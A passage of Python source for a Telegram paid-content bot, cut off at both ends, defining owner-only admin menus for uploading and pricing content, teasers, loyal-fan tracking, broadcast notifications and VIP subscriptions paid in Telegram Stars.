ID\n\n👥 **User Management:**\n• `/owner_list_users` - View paying customers only\n• `/owner_analytics` - Detailed analytics dashboard\n• `/owner_list_vips` - View active VIP subscribers\n\n⭐ **Loyal Fan Management:**\n• Mark your best customers as loyal fans\n• Track reasons and dates when fans were marked\n• View all loyal fans with their details\n• Remove loyal status when needed\n\n📢 **Notification System:**\n• Send targeted messages to specific user groups\n• Notify all users, VIP only, or non-VIP only\n• Interactive message composition interface\n• Track delivery statistics and blocked users\n\n🤖 **Bot Configuration:**\n• `/owner_set_response [key] [text]` - Update Responses\n  Keys: greeting, question, compliment, default\n\nℹ️ **Information:**\n• `/owner_help` - Show this help message\n\n💡 **Pro Tips:**\n- Start with VIP content for premium user experience\n- VIP subscriptions generate more revenue than individual sales\n- Upload files directly for automatic Telegram hosting\n- Analytics show only paying customers\n- Responses support emojis and markdown\n- All changes take effect immediately\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=1)\n    \n    # VIP Management - TOP PRIORITY section (keep as-is)\n    vip_count = get_vip_content_count()\n    markup.add(types.InlineKeyboardButton(f\"💎 VIP Dashboard ({vip_count})\", callback_data=\"cmd_vip\"))\n    \n    # Section menus\n    markup.add(types.InlineKeyboardButton(\"📦 Content Management\", callback_data=\"content_management_menu\"))\n    markup.add(types.InlineKeyboardButton(\"🎬 Teaser Management\", callback_data=\"teaser_management_menu\"))\n    markup.add(types.InlineKeyboardButton(\"👥 User Management\", callback_data=\"user_management_menu\"))\n    markup.add(types.InlineKeyboardButton(\"⭐ Loyal Fan Management\", callback_data=\"loyal_fan_management_menu\"))\n    markup.add(types.InlineKeyboardButton(\"📢 Notification System\", callback_data=\"notification_management_menu\"))\n    markup.add(types.InlineKeyboardButton(\"🤖 Bot Configuration\", callback_data=\"bot_config_menu\"))\n    \n    bot.send_message(message.chat.id, help_text, reply_markup=markup, parse_mode='Markdown')\n\n# Section menu functions\ndef show_content_management_menu(chat_id):\n    \"\"\"Show Content Management section menu\"\"\"\n    menu_text = \"\"\"\n📦 *CONTENT MANAGEMENT* 📦\n\nChoose an action below to manage your content:\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=2)\n    markup.add(\n        types.InlineKeyboardButton(\"📤 Upload Content\", callback_data=\"start_upload\"),\n        types.InlineKeyboardButton(\"🔗 Add URL\", callback_data=\"owner_add_content\")\n    )\n    markup.add(\n        types.InlineKeyboardButton(\"✏️ Edit Content\", callback_data=\"show_edit_content_menu\"),\n        types.InlineKeyboardButton(\"❌ Delete Content\", callback_data=\"show_delete_content_help\")\n    )\n    markup.add(types.InlineKeyboardButton(\"🔙 Back to Owner Help\", callback_data=\"owner_help\"))\n    \n    bot.send_message(chat_id, menu_text, reply_markup=markup, parse_mode='Markdown')\n\ndef show_edit_content_menu(chat_id):\n    \"\"\"Show Edit Content menu with all content items as buttons\"\"\"\n    # Get only browse content items (VIP content is managed separately)\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('SELECT name, price_stars, description, content_type, created_date FROM content_items WHERE content_type = ? ORDER BY created_date DESC', ('browse',))\n    items = cursor.fetchall()\n    conn.close()\n    \n    if not items:\n        empty_text = \"\"\"\n✏️ <b>EDIT CONTENT</b> ✏️\n\n📭 <b>No content found!</b>\n\nAdd some content first to be able to edit it.\n\"\"\"\n        markup = types.InlineKeyboardMarkup()\n        markup.add(types.InlineKeyboardButton(\"📤 Upload Content\", callback_data=\"start_upload\"))\n        markup.add(types.InlineKeyboardButton(\"🔙 Back to Content Management\", callback_data=\"content_management_menu\"))\n        \n        bot.send_message(chat_id, empty_text, reply_markup=markup, parse_mode='HTML')\n        return\n    \n    edit_text = f\"\"\"\n✏️ <b>EDIT CONTENT</b> ✏️\n\n📝 <b>Select content to edit:</b>\n\nFound {len(items)} browse content item(s). Click on any item below to edit its details:\n\n💡 <b>Note:</b> VIP content has its own management section.\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=1)\n    \n    for name, price, description, content_type, created_date in items:\n        # Format the display text\n        try:\n            date_obj = datetime.datetime.fromisoformat(created_date)\n            formatted_date = date_obj.strftime(\"%b %d\")\n        except:\n            formatted_date = \"N/A\"\n        \n        # Truncate long descriptions\n        short_desc = description[:25] + \"...\" if len(description) > 25 else description\n        \n        # Add content type indicator\n        type_indicator = \"💎\" if content_type == \"vip\" else \"🛒\"\n        \n        # Create button text with details\n        button_text = f\"{type_indicator} {name} | {price}⭐ | {formatted_date}\"\n        \n        markup.add(types.InlineKeyboardButton(button_text, callback_data=f\"edit_content_{name}\"))\n    \n    markup.add(types.InlineKeyboardButton(\"🔙 Back to Content Management\", callback_data=\"content_management_menu\"))\n    \n    bot.send_message(chat_id, edit_text, reply_markup=markup, parse_mode='HTML')\n\ndef show_delete_content_menu(chat_id):\n    \"\"\"Show Delete Content menu with all content items as buttons\"\"\"\n    # Get only browse content items (VIP content is managed separately)\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('SELECT name, price_stars, description, content_type, created_date FROM content_items WHERE content_type = ? ORDER BY created_date DESC', ('browse',))\n    items = cursor.fetchall()\n    conn.close()\n    \n    if not items:\n        empty_text = \"\"\"\n🗑️ <b>DELETE CONTENT</b> 🗑️\n\n📭 <b>No content found!</b>\n\nYou don't have any content to delete yet. Add some content first!\n\"\"\"\n        markup = types.InlineKeyboardMarkup()\n        markup.add(types.InlineKeyboardButton(\"📤 Upload Content\", callback_data=\"start_upload\"))\n        markup.add(types.InlineKeyboardButton(\"🔙 Back to Content Management\", callback_data=\"content_management_menu\"))\n        \n        bot.send_message(chat_id, empty_text, reply_markup=markup, parse_mode='HTML')\n        return\n    \n    delete_text = f\"\"\"\n🗑️ <b>DELETE CONTENT</b> 🗑️\n\n⚠️ <b>Select content to DELETE:</b>\n\nFound {len(items)} browse content item(s). Click on any item below to permanently delete it:\n\n💡 <b>Note:</b> VIP content has its own management section.\n\n<b>⚠️ WARNING:</b> This action cannot be undone!\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=1)\n    \n    for name, price, description, content_type, created_date in items:\n        # Format the display text\n        try:\n            date_obj = datetime.datetime.fromisoformat(created_date)\n            formatted_date = date_obj.strftime(\"%b %d\")\n        except:\n            formatted_date = \"N/A\"\n        \n        # Truncate long descriptions\n        short_desc = description[:25] + \"...\" if len(description) > 25 else description\n        \n        # Add content type indicator\n        type_indicator = \"💎\" if content_type == \"vip\" else \"🛒\"\n        \n        # Create button text with details\n        button_text = f\"🗑️ {type_indicator} {name} | {price}⭐ | {formatted_date}\"\n        \n        markup.add(types.InlineKeyboardButton(button_text, callback_data=f\"confirm_delete_{name}\"))\n    \n    markup.add(types.InlineKeyboardButton(\"🔙 Back to Content Management\", callback_data=\"content_management_menu\"))\n    \n    bot.send_message(chat_id, delete_text, reply_markup=markup, parse_mode='HTML')\n\ndef show_content_edit_interface(chat_id, content_name):\n    \"\"\"Show edit interface for a specific content item\"\"\"\n    # Get content details\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('SELECT name, price_stars, file_path, description, content_type, created_date FROM content_items WHERE name = ?', (content_name,))\n    content = cursor.fetchone()\n    conn.close()\n    \n    if not content:\n        bot.send_message(chat_id, f\"❌ Content '{content_name}' not found.\")\n        return\n    \n    name, price, file_path, description, content_type, created_date = content\n    \n    # Format creation date\n    try:\n        date_obj = datetime.datetime.fromisoformat(created_date)\n        formatted_date = date_obj.strftime(\"%Y-%m-%d %H:%M\")\n    except:\n        formatted_date = created_date\n    \n    # Escape HTML special characters\n    safe_name = name.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n    safe_description = description.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n    \n    # Content type indicator\n    type_indicator = \"💎 VIP\" if content_type == \"vip\" else \"🛒 Browse\"\n    \n    # Generate secure preview URL using Flask url_for\n    def generate_preview_url(content_name):\n        \"\"\"Generate secure preview URL using Flask's url_for within app context\"\"\"\n        try:\n            with app.app_context():\n                from flask import url_for, request\n                # Use url_for to generate the URL properly\n                return url_for('preview_content', content_name=content_name, _external=True)\n        except Exception as e:\n            logger.error(f\"Error generating preview URL: {e}\")\n            # Fallback to a relative URL if url_for fails\n            import urllib.parse\n            encoded_name = urllib.parse.quote(content_name)\n            return f\"/content/preview/{encoded_name}\"\n    \n    preview_url = generate_preview_url(name)\n    \n    # Create secure file path display with clickable link\n    if file_path.startswith(('http://', 'https://')):\n        # For external URLs, sanitize and display safely\n        safe_url = file_path.replace('<', '&lt;').replace('>', '&gt;').replace('\"', '&quot;')\n        file_display = f\"<a href='{safe_url}'>🔗 External URL (Click to view)</a>\"\n    else:\n        # For internal content, use the generated preview URL\n        safe_preview_url = preview_url.replace('<', '&lt;').replace('>', '&gt;').replace('\"', '&quot;')\n        file_display = f\"<a href='{safe_preview_url}'>🖼️ Preview Content (Click to view)</a>\"\n    \n    edit_text = f\"\"\"\n✏️ <b>EDIT CONTENT</b> ✏️\n\n📝 <b>Content Details:</b>\n\n<b>Name:</b> {safe_name}\n<b>Type:</b> {type_indicator}\n<b>Price:</b> {price} Stars\n<b>Created:</b> {formatted_date}\n\n<b>Description:</b>\n{safe_description}\n\n<b>File Path:</b> {file_display}\n\n💡 <b>What would you like to edit?</b>\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=1)\n    markup.add(types.InlineKeyboardButton(f\"💰 Edit Price ({price} Stars)\", callback_data=f\"edit_price_{name}\"))\n    markup.add(types.InlineKeyboardButton(\"📝 Edit Description\", callback_data=f\"edit_description_{name}\"))\n    markup.add(types.InlineKeyboardButton(\"📁 Edit File Path\", callback_data=f\"edit_file_path_{name}\"))\n    \n    # Add delete option\n    markup.add(types.InlineKeyboardButton(f\"🗑️ Delete {name}\", callback_data=f\"confirm_delete_content_{name}\"))\n    \n    # Navigation buttons\n    markup.add(types.InlineKeyboardButton(\"🔙 Back to Edit Menu\", callback_data=\"show_edit_content_menu\"))\n    markup.add(types.InlineKeyboardButton(\"🏠 Content Management\", callback_data=\"content_management_menu\"))\n    \n    bot.send_message(chat_id, edit_text, reply_markup=markup, parse_mode='HTML')\n\n\ndef show_teaser_management_menu(chat_id):\n    \"\"\"Show Teaser Management section menu\"\"\"\n    menu_text = \"\"\"\n🎬 *TEASER MANAGEMENT* 🎬\n\nChoose an action below to manage your teasers:\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=2)\n    markup.add(\n        types.InlineKeyboardButton(\"🎬 Upload Teaser\", callback_data=\"start_teaser_upload\"),\n        types.InlineKeyboardButton(\"📝 Manage Teasers\", callback_data=\"owner_list_teasers\")\n    )\n    markup.add(types.InlineKeyboardButton(\"❌ Delete Teaser\", callback_data=\"show_delete_teaser_menu\"))\n    markup.add(types.InlineKeyboardButton(\"🔙 Back to Owner Help\", callback_data=\"owner_help\"))\n    \n    bot.send_message(chat_id, menu_text, reply_markup=markup, parse_mode='Markdown')\n\ndef show_delete_teaser_menu(chat_id):\n    \"\"\"Show Delete Teaser menu with all teasers as buttons\"\"\"\n    teasers = get_teasers_with_id()\n    \n    if not teasers:\n        empty_text = \"\"\"\n🎬 <b>DELETE TEASER</b> 🎬\n\n📭 <b>No teasers found!</b>\n\nUpload some teasers first to be able to delete them.\n\"\"\"\n        markup = types.InlineKeyboardMarkup()\n        markup.add(types.InlineKeyboardButton(\"🎬 Upload Teaser\", callback_data=\"start_teaser_upload\"))\n        markup.add(types.InlineKeyboardButton(\"🔙 Back to Teaser Management\", callback_data=\"teaser_management_menu\"))\n        \n        bot.send_message(chat_id, empty_text, reply_markup=markup, parse_mode='HTML')\n        return\n    \n    delete_text = f\"\"\"\n🎬 <b>DELETE TEASER</b> 🎬\n\n🗑️ <b>Select teaser to delete:</b>\n\nFound {len(teasers)} teaser(s). Click on any teaser below to delete it:\n\n⚠️ <b>Warning:</b> This action cannot be undone!\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=1)\n    \n    for teaser_id, file_path, file_type, description, created_date in teasers[:10]:\n        # Format creation date\n        try:\n            date_obj = datetime.datetime.fromisoformat(created_date)\n            formatted_date = date_obj.strftime(\"%b %d, %H:%M\")\n        except:\n            formatted_date = \"N/A\"\n        \n        # Truncate long descriptions\n        short_desc = description[:30] + \"...\" if len(description) > 30 else description\n        \n        # Add file type indicator\n        type_icon = \"📷\" if file_type == \"photo\" else \"🎥\" if file_type == \"video\" else \"📄\"\n        \n        # Create button text with details\n        button_text = f\"{type_icon} ID:{teaser_id} | {short_desc} | {formatted_date}\"\n        \n        markup.add(types.InlineKeyboardButton(button_text, callback_data=f\"delete_teaser_{teaser_id}\"))\n    \n    if len(teasers) > 10:\n        delete_text += f\"\\n⚠️ <b>Note:</b> Showing first 10 teasers only.\\n\"\n    \n    markup.add(types.InlineKeyboardButton(\"🔙 Back to Teaser Management\", callback_data=\"teaser_management_menu\"))\n    \n    bot.send_message(chat_id, delete_text, reply_markup=markup, parse_mode='HTML')\n\ndef show_user_management_menu(chat_id):\n    \"\"\"Show User Management section menu\"\"\"\n    menu_text = \"\"\"\n👥 *USER MANAGEMENT* 👥\n\nChoose an action below to manage users and analytics:\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=1)\n    markup.add(types.InlineKeyboardButton(\"👥 View Customers\", callback_data=\"owner_list_users\"))\n    markup.add(types.InlineKeyboardButton(\"📊 Analytics Dashboard\", callback_data=\"analytics_dashboard\"))\n    markup.add(types.InlineKeyboardButton(\"💎 View VIP Members\", callback_data=\"owner_list_vips\"))\n    markup.add(types.InlineKeyboardButton(\"🔙 Back to Owner Help\", callback_data=\"owner_help\"))\n    \n    bot.send_message(chat_id, menu_text, reply_markup=markup, parse_mode='Markdown')\n\ndef show_bot_config_menu(chat_id):\n    \"\"\"Show Bot Configuration section menu\"\"\"\n    menu_text = \"\"\"\n🤖 *BOT CONFIGURATION* 🤖\n\nChoose an action below to configure bot settings:\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=1)\n    markup.add(types.InlineKeyboardButton(\"✏️ Set Responses\", callback_data=\"show_set_responses_help\"))\n    markup.add(types.InlineKeyboardButton(\"⚙️ Other Settings\", callback_data=\"show_other_settings_help\"))\n    markup.add(types.InlineKeyboardButton(\"🔙 Back to Owner Help\", callback_data=\"owner_help\"))\n    \n    bot.send_message(chat_id, menu_text, reply_markup=markup, parse_mode='Markdown')\n\ndef show_loyal_fan_management_menu(chat_id):\n    \"\"\"Show Loyal Fan Management section menu\"\"\"\n    # Get loyal fan count\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('SELECT COUNT(*) FROM loyal_fans')\n    loyal_count = cursor.fetchone()[0]\n    conn.close()\n    \n    menu_text = f\"\"\"\n⭐ *LOYAL FAN MANAGEMENT* ⭐\n\nManage your most valuable customers and superfans.\n\n📊 **Current Status:**\n• Loyal Fans: {loyal_count}\n\nChoose an action below:\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=2)\n    markup.add(\n        types.InlineKeyboardButton(\"⭐ Mark New Loyal Fan\", callback_data=\"mark_loyal_fan\"),\n        types.InlineKeyboardButton(\"📋 View All Loyal Fans\", callback_data=\"list_loyal_fans\")\n    )\n    markup.add(types.InlineKeyboardButton(\"❌ Remove Loyal Status\", callback_data=\"remove_loyal_fan\"))\n    markup.add(types.InlineKeyboardButton(\"🔙 Back to Owner Help\", callback_data=\"owner_help\"))\n    \n    bot.send_message(chat_id, menu_text, reply_markup=markup, parse_mode='Markdown')\n\ndef show_notification_management_menu(chat_id):\n    \"\"\"Show Notification System section menu\"\"\"\n    menu_text = \"\"\"\n📢 *NOTIFICATION SYSTEM* 📢\n\nSend targeted messages to your users.\n\n🎯 **Target Groups:**\n• All Users - Everyone who has used the bot\n• VIP Members Only - Active VIP subscribers\n• Non-VIP Users - Users without VIP status\n\nChoose who to notify:\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=1)\n    markup.add(types.InlineKeyboardButton(\"📢 Notify All Users\", callback_data=\"notify_all_users\"))\n    markup.add(types.InlineKeyboardButton(\"💎 Notify VIP Members\", callback_data=\"notify_vip_users\"))\n    markup.add(types.InlineKeyboardButton(\"👥 Notify Non-VIP Users\", callback_data=\"notify_non_vip_users\"))\n    markup.add(types.InlineKeyboardButton(\"🔙 Back to Owner Help\", callback_data=\"owner_help\"))\n    \n    bot.send_message(chat_id, menu_text, reply_markup=markup, parse_mode='Markdown')\n\n# Owner VIP Management Commands\n\n\n@bot.message_handler(commands=['owner_vip_analytics'])\ndef owner_vip_analytics(message):\n    \"\"\"Handle /owner_vip_analytics command\"\"\"\n    if not is_owner(message.from_user.id):\n        bot.send_message(message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        return\n    \n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    \n    # Get VIP statistics\n    cursor.execute('SELECT COUNT(*) FROM vip_subscriptions WHERE is_active = 1')\n    active_vip_count = cursor.fetchone()[0]\n    \n    cursor.execute('SELECT COUNT(*) FROM vip_subscriptions')\n    total_vip_subscriptions = cursor.fetchone()[0]\n    \n    cursor.execute('SELECT SUM(total_payments) FROM vip_subscriptions')\n    total_vip_payments = cursor.fetchone()[0] or 0\n    \n    # Get VIP settings\n    vip_price = int(get_vip_settings('vip_price_stars') or 399)\n    total_vip_revenue = total_vip_payments * vip_price\n    \n    # Get VIP users details\n    cursor.execute('''\n        SELECT u.first_name, u.username, v.start_date, v.expiry_date, v.total_payments\n        FROM vip_subscriptions v\n        JOIN users u ON v.user_id = u.user_id\n        WHERE v.is_active = 1\n        ORDER BY v.total_payments DESC\n        LIMIT 10\n    ''')\n    active_vips = cursor.fetchall()\n    \n    conn.close()\n    \n    analytics_text = f\"\"\"\n💎 **VIP ANALYTICS DASHBOARD** 💎\n\n📊 **VIP Statistics:**\n👑 Active VIP Members: {active_vip_count}\n📈 Total VIP Subscriptions Ever: {total_vip_subscriptions}\n💰 Total VIP Payments: {total_vip_payments}\n💵 Total VIP Revenue: {total_vip_revenue} Stars\n💰 Current VIP Price: {vip_price} Stars/month\n\n🏆 **Top VIP Members:**\n\"\"\"\n    \n    for i, (first_name, username, start_date, expiry_date, payments) in enumerate(active_vips[:5], 1):\n        safe_first_name = (first_name or 'N/A').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n        safe_username = (username or 'none').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n        analytics_text += f\"{i}. {safe_first_name} (@{safe_username}) - {payments} payments\\n\"\n    \n    bot.send_message(message.chat.id, analytics_text, parse_mode='HTML')\n\n@bot.message_handler(commands=['vip'])\ndef vip_command(message):\n    \"\"\"Handle /vip command - VIP content management dashboard\"\"\"\n    if not is_owner(message.from_user.id):\n        bot.send_message(message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        return\n    \n    # Get VIP content statistics\n    vip_count = get_vip_content_count()\n    vip_price = get_vip_settings('vip_price_stars') or '399'\n    vip_duration = get_vip_settings('vip_duration_days') or '30'\n    \n    # Get VIP subscriber count\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('SELECT COUNT(*) FROM vip_subscriptions WHERE is_active = 1')\n    vip_subscribers = cursor.fetchone()[0]\n    conn.close()\n    \n    dashboard_text = f\"\"\"\n💎 <b>VIP CONTENT MANAGEMENT DASHBOARD</b> 💎\n\n📊 <b>VIP Statistics:</b>\n• VIP Content Items: {vip_count}\n• Active VIP Subscribers: {vip_subscribers}\n• VIP Price: {vip_price} Stars\n• VIP Duration: {vip_duration} days\n\n🎯 <b>VIP Management Options:</b>\nUse the buttons below to manage your VIP content and settings.\n\n💡 <b>VIP Strategy:</b>\nVIP content generates higher revenue through subscriptions.\nVIP members get FREE access to all VIP-only content.\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=1)\n    markup.add(types.InlineKeyboardButton(f\"📦 Add VIP Content\", callback_data=\"vip_add_content\"))\n    \n    if vip_count > 0:\n        markup.add(types.InlineKeyboardButton(f\"📋 Manage VIP Content ({vip_count})\", callback_data=\"vip_manage_content\"))\n    \n    markup.add(types.InlineKeyboardButton(\"💎 VIP Members\", callback_data=\"owner_list_vips\"))\n    markup.add(types.InlineKeyboardButton(\"⚙️ VIP Settings\", callback_data=\"vip_settings\"))\n    markup.add(types.InlineKeyboardButton(\"📊 VIP Analytics\", callback_data=\"vip_analytics\"))\n    markup.add(types.InlineKeyboardButton(\"🎬 VIP Teasers\", callback_data=\"vip_teasers_management\"))\n    markup.add(types.InlineKeyboardButton(\"🔙 Back to Owner Help\", callback_data=\"owner_help\"))\n    \n    bot.send_message(message.chat.id, dashboard_text, reply_markup=markup, parse_mode='HTML')\n\ndef show_vip_add_content_interface(chat_id):\n    \"\"\"Show interface for adding new VIP content\"\"\"\n    add_text = \"\"\"\n💎 <b>ADD VIP CONTENT</b> 💎\n\nVIP content is exclusive to subscribers and generates more revenue.\n\n📝 <b>Enhanced Upload Process:</b>\n• Upload files directly from your device\n• Custom naming with smart defaults  \n• Optional descriptions\n• Instant VIP content creation\n\n💡 <b>VIP Benefits:</b>\n• VIP members get FREE access to all VIP content\n• Higher revenue potential through subscriptions  \n• Exclusive feeling increases loyalty\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup()\n    markup.add(types.InlineKeyboardButton(\"📤 Start VIP Upload\", callback_data=\"start_vip_upload\"))\n    markup.add(types.InlineKeyboardButton(\"🔙 Back to VIP Dashboard\", callback_data=\"cmd_vip\"))\n    \n    bot.send_message(chat_id, add_text, reply_markup=markup, parse_mode='HTML')\n\ndef show_vip_content_management(chat_id):\n    \"\"\"Show VIP content management interface\"\"\"\n    vip_content = get_vip_content_list()\n    \n    if not vip_content:\n        empty_text = \"\"\"\n💎 <b>VIP CONTENT MANAGEMENT</b> 💎\n\n📭 <b>No VIP content found!</b>\n\nAdd your first VIP content to start earning premium subscription revenue.\n\"\"\"\n        markup = types.InlineKeyboardMarkup()\n        markup.add(types.InlineKeyboardButton(\"📦 Add VIP Content\", callback_data=\"vip_add_content\"))\n        markup.add(types.InlineKeyboardButton(\"🔙 Back to VIP Dashboard\", callback_data=\"cmd_vip\"))\n        \n        bot.send_message(chat_id, empty_text, reply_markup=markup, parse_mode='HTML')\n        return\n    \n    content_text = \"\"\"\n💎 <b>VIP CONTENT MANAGEMENT</b> 💎\n\n🎯 <b>Your VIP Content:</b>\n\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=1)\n    \n    for i, (name, price, file_path, description, created_date) in enumerate(vip_content[:10]):\n        # Format creation date\n        try:\n            date_obj = datetime.datetime.fromisoformat(created_date)\n            formatted_date = date_obj.strftime(\"%b %d\")\n        except:\n            formatted_date = \"N/A\"\n        \n        # Truncate long descriptions\n        short_desc = description[:30] + \"...\" if len(description) > 30 else description\n        \n        content_text += f\"<b>{i+1}. {name}</b>\\n\"\n        content_text += f\"   💰 {price} Stars | 📅 {formatted_date}\\n\"\n        content_text += f\"   📝 {short_desc}\\n\\n\"\n        \n        # Add management buttons\n        markup.add(types.InlineKeyboardButton(f\"✏️ Edit {name}\", callback_data=f\"vip_edit_{name}\"))\n        markup.add(types.InlineKeyboardButton(f\"🗑️ Delete {name}\", callback_data=f\"vip_delete_{name}\"))\n    \n    if len(vip_content) > 10:\n        content_text += f\"... and {len(vip_content) - 10} more items\\n\\n\"\n    \n    content_text += \"💡 <b>Tip:</b> VIP members get FREE access to all this content!\"\n    \n    markup.add(types.InlineKeyboardButton(\"➕ Add More VIP Content\", callback_data=\"vip_add_content\"))\n    markup.add(types.InlineKeyboardButton(\"🔙 Back to VIP Dashboard\", callback_data=\"cmd_vip\"))\n    \n    bot.send_message(chat_id, content_text, reply_markup=markup, parse_mode='HTML')\n\ndef show_vip_settings_interface(chat_id):\n    \"\"\"Show VIP settings management interface\"\"\"\n    vip_price = get_vip_settings('vip_price_stars') or '399'\n    vip_duration = get_vip_settings('vip_duration_days') or '30'\n    vip_description = get_vip_settings('vip_description') or 'Premium VIP access'\n    \n    settings_text = f\"\"\"\n⚙️ <b>VIP SETTINGS</b> ⚙️\n\n📋 <b>Current VIP Configuration:</b>\n\n💰 <b>Price:</b> {vip_price} Stars\n⏰ <b>Duration:</b> {vip_duration} days  \n📝 <b>Description:</b> {vip_description}\n\n🔧 <b>Interactive Settings:</b>\nUse the buttons below for guided setup, or use manual commands:\n\n<b>Manual Commands:</b>\n• <code>/owner_set_vip_price [amount]</code>\n• <code>/owner_set_vip_duration [days]</code>  \n• <code>/owner_set_vip_description [text]</code>\n\n💡 <b>Pricing Tips:</b>\n• Range: 1 - 150,000 Stars (399 current default)\n• 399 Stars ≈ $4 USD | 1,000 Stars ≈ $10 USD\n• Higher price = more exclusive feeling\n• 30-day duration balances value and recurring revenue\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=1)\n    \n    # Add interactive setting buttons\n    markup.add(types.InlineKeyboardButton(\"💰 Set VIP Price\", callback_data=\"vip_set_price_btn\"))\n    markup.add(types.InlineKeyboardButton(\"⏰ Set Duration\", callback_data=\"vip_set_duration_btn\"))  \n    markup.add(types.InlineKeyboardButton(\"📝 Set Description\", callback_data=\"vip_set_description_btn\"))\n    \n    # Navigation\n    markup.add(types.InlineKeyboardButton(\"🔙 Back to VIP Dashboard\", callback_data=\"cmd_vip\"))\n    \n    bot.send_message(chat_id, settings_text, reply_markup=markup, parse_mode='HTML')\n\ndef show_vip_analytics(chat_id):\n    \"\"\"Show VIP analytics dashboard\"\"\"\n    # Get VIP statistics\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    \n    # Active VIP subscribers\n    cursor.execute('SELECT COUNT(*) FROM vip_subscriptions WHERE is_active = 1')\n    active_vips = cursor.fetchone()[0]\n    \n    # Total VIP revenue (all time)\n    vip_price = int(get_vip_settings('vip_price_stars') or 399)\n    cursor.execute('SELECT SUM(total_payments) FROM vip_subscriptions')\n    total_payments = cursor.fetchone()[0] or 0\n    total_vip_revenue = total_payments * vip_price\n    \n    # Top VIP subscribers\n    cursor.execute('''\n        SELECT vs.user_id, u.first_name, u.username, vs.total_payments, vs.expiry_date\n        FROM vip_subscriptions vs\n        LEFT JOIN users u ON vs.user_id = u.user_id\n        WHERE vs.is_active = 1\n        ORDER BY vs.total_payments DESC\n        LIMIT 5\n    ''')\n    top_vips = cursor.fetchall()\n    \n    conn.close()\n    \n    analytics_text = f\"\"\"\n📊 <b>VIP ANALYTICS DASHBOARD</b> 📊\n\n💎 <b>VIP Statistics:</b>\n• Active Subscribers: {active_vips}\n• Total VIP Revenue: {total_vip_revenue:,} Stars\n• Average Revenue per VIP: {(total_vip_revenue // max(active_vips, 1)):,} Stars\n\n🏆 <b>Top VIP Subscribers:</b>\n\"\"\"\n    \n    if top_vips:\n        for i, (user_id, first_name, username, payments, expiry) in enumerate(top_vips):\n            safe_first_name = (first_name or \"N/A\").replace('<', '&lt;').replace('>', '&gt;')\n            safe_username = username or \"none\"\n            \n            # Calculate days left\n            try:\n                expiry_date = datetime.datetime.fromisoformat(expiry)\n                days_left = (expiry_date - datetime.datetime.now()).days\n                status = f\"{days_left}d left\" if days_left > 0 else \"Expired\"\n            except:\n                status = \"Unknown\"\n            \n            analytics_text += f\"{i+1}. {safe_first_name} (@{safe_username})\\n\"\n            analytics_text += f\"   💰 {payments} payments | ⏰ {status}\\n\\n\"\n    else:\n        analytics_text += \"No VIP subscribers yet.\\n\\n\"\n    \n    analytics_text += \"\"\"\n💡 <b>Growth Tips:</b>\n• Add more exclusive VIP content\n• Promote VIP benefits in teasers\n• Offer limited-time VIP discounts\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup()\n    markup.add(types.InlineKeyboardButton(\"🔙 Back to VIP Dashboard\", callback_data=\"cmd_vip\"))\n    \n    bot.send_message(chat_id, analytics_text, reply_markup=markup, parse_mode='HTML')\n\ndef show_vip_teasers_management(chat_id):\n    \"\"\"Show VIP teasers management interface\"\"\"\n    vip_teasers = get_vip_teasers_with_id()\n    vip_teaser_count = len(vip_teasers)\n    \n    management_text = f\"\"\"\n🎬 <b>VIP TEASERS MANAGEMENT</b> 🎬\n\n📝 <b>What are VIP Teasers?</b>\nVIP teasers are exclusive preview content shown only to your VIP members when they use the /teaser command. These special teasers help VIP members feel extra valued and give them exclusive glimpses of your premium content.\n\n📊 <b>Current Status:</b>\n• VIP Teasers: {vip_teaser_count}\n• Regular Teasers: Available separately\n\n💡 <b>VIP Teaser Strategy:</b>\n• Show more revealing/intimate content than regular teasers\n• Make VIP members feel special and appreciated\n• Use high-quality photos/videos only\n• Keep descriptions engaging and personal\n\n🎯 <b>Management Options:</b>\nChoose an action below to manage your VIP teasers.\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=1)\n    markup.add(types.InlineKeyboardButton(\"📤 Upload VIP Teaser\", callback_data=\"vip_teaser_upload\"))\n    \n    if vip_teaser_count > 0:\n        markup.add(types.InlineKeyboardButton(f\"🗑️ Delete VIP Teaser ({vip_teaser_count})\", callback_data=\"vip_teaser_delete\"))\n        markup.add(types.InlineKeyboardButton(f\"✏️ Edit VIP Teaser ({vip_teaser_count})\", callback_data=\"vip_teaser_edit\"))\n    \n    markup.add(types.InlineKeyboardButton(\"🔙 Back to VIP Dashboard\", callback_data=\"cmd_vip\"))\n    \n    bot.send_message(chat_id, management_text, reply_markup=markup, parse_mode='HTML')\n\ndef start_vip_teaser_upload_session(chat_id, user_id):\n    \"\"\"Start guided VIP teaser upload session\"\"\"\n    if user_id != OWNER_ID:\n        bot.send_message(chat_id, \"❌ Access denied. This is an owner-only 